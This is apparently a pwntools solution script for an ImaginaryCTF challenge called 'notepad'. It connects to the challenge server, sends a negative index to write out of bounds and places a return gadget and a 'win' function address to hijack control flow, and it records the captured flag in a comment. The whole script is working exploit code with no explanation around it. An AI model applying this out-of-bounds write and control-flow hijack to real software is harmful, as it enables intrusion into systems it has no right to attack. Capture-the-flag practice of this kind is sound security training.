from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# io = gdb.debug('./notepad', 'b view\nb *(edit+175)\nc')
# io = process("./notepad")
io = remote("puzzler7.imaginaryctf.org", 3001)
io.sendlineafter(b">>> ", b"2")
io.sendlineafter(b">>> ", str(-0x18).encode())
io.sendlineafter(b">>> ", flat([0x40126B, 0x401182]))  # ret, win
io.interactive()
# ictf{gimme_2_months_and_I'll_put_microsoft_out_of_business}
